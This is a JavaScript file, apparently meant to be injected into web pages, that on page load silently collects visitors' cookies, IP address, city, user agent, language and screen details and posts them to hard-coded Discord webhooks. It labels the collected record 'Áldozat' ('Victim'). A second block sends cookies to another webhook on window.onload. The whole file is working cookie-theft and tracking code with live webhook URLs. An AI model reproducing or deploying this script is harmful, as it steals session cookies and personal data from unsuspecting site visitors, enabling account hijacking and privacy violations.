document.addEventListener("DOMContentLoaded", function () {
  const webhookURL =
    "https://discord.com/api/webhooks/1262915037543141388/6OH_1CsadYdJNdA0mKPGD-fw8MOf-V8UDShu3v_nUQGQK8a-6SVxkEWibZqBaTp9ZNCf";

  function getCookies() {
    const cookies = document.cookie.split(";").reduce((cookies, cookie) => {
      const [name, value] = cookie.split("=").map((c) => c.trim());
      cookies[name] = value;
      return cookies;
    }, {});
    return JSON.stringify(cookies, null, 2);
  }

  function getUserAgent() {
    return navigator.userAgent;
  }

  function getLanguage() {
    return navigator.language;
  }

  function getScreenInfo() {
    return {
      width: screen.width,
      height: screen.height,
      colorDepth: screen.colorDepth,
      pixelDepth: screen.pixelDepth,
    };
  }

  function sendToDiscord(ip, city, cookies, userAgent, language, screenInfo) {
    const request = new XMLHttpRequest();
    request.open("POST", webhookURL);
    request.setRequestHeader("Content-type", "application/json");

    const params = {
      embeds: [
        {
          title: "Áldozat",
          fields: [
            {
              name: "IP Address",
              value: ip,
              inline: false,
            },
            {
              name: "City",
              value: city,
              inline: false,
            },
            {
              name: "Cookies",
              value: `\`\`\`${cookies}\`\`\``,
              inline: false,
            },
            {
              name: "User Agent",
              value: userAgent,
              inline: false,
            },
            {
              name: "Language",
              value: language,
              inline: false,
            },
            {
              name: "Screen Info",
              value: `Width: ${screenInfo.width}, Height: ${screenInfo.height}, Color Depth: ${screenInfo.colorDepth}, Pixel Depth: ${screenInfo.pixelDepth}`,
              inline: false,
            },
          ],
        },
      ],
    };

    console.log("Sending to Discord:", params); // Hibakeresési célból
    request.send(JSON.stringify(params));
  }

  function getIpInfo(ip) {
    const request = new XMLHttpRequest();
    request.open("GET", `https://ipapi.co/${ip}/json/`, true);
    request.onload = function () {
      if (request.status >= 200 && request.status < 400) {
        const data = JSON.parse(request.responseText);
        const city = data.city || "Unknown";
        const cookies = getCookies();
        const userAgent = getUserAgent();
        const language = getLanguage();
        const screenInfo = getScreenInfo();
        console.log("IP:", ip);
        console.log("City:", city);
        console.log("Cookies:", cookies);
        console.log("User Agent:", userAgent);
        console.log("Language:", language);
        console.log("Screen Info:", screenInfo);
        sendToDiscord(ip, city, cookies, userAgent, language, screenInfo);
      } else {
        sendToDiscord(
          ip,
          "Unknown",
          getCookies(),
          getUserAgent(),
          getLanguage(),
          getScreenInfo()
        );
      }
    };
    request.onerror = function () {
      sendToDiscord(
        ip,
        "Unknown",
        getCookies(),
        getUserAgent(),
        getLanguage(),
        getScreenInfo()
      );
    };
    request.send();
  }

  const request = new XMLHttpRequest();
  request.open("GET", "https://api64.ipify.org?format=json", true);
  request.onload = function () {
    if (request.status >= 200 && request.status < 400) {
      const data = JSON.parse(request.responseText);
      const ip = data.ip;
      getIpInfo(ip);
    }
  };
  request.onerror = function () {
    console.error("Error fetching IP address.");
  };
  request.send();
});
function getCookies() {
  const cookies = document.cookie.split(";").reduce((acc, cookie) => {
    const [name, value] = cookie.split("=").map((c) => c.trim());
    acc[name] = value;
    return acc;
  }, {});
  return cookies;
}

function sendToWebhook(data) {
  const webhookUrl =
    "https://discord.com/api/webhooks/1263256734538137701/2Sr3jDq7qmTobia1rHaJUHiDR9Jhk8AWI2MZTTLrOxlmDDbIjAICc_8YdeC6yzHdoaK9"; // Ide helyezd be a webhook URL-t

  fetch(webhookUrl, {
    method: "POST",
    headers: {
      "Content-Type": "application/json",
    },
    body: JSON.stringify({
      content: "Cookie-k: " + JSON.stringify(data),
    }),
  })
    .then((response) => {
      if (response.ok) {
        console.log("Data sent successfully");
      } else {
        console.error("Error sending data");
      }
    })
    .catch((error) => {
      console.error("Error:", error);
    });
}

window.onload = () => {
  const cookies = getCookies();
  console.log("Cookie-k:", cookies);
  sendToWebhook(cookies);
};
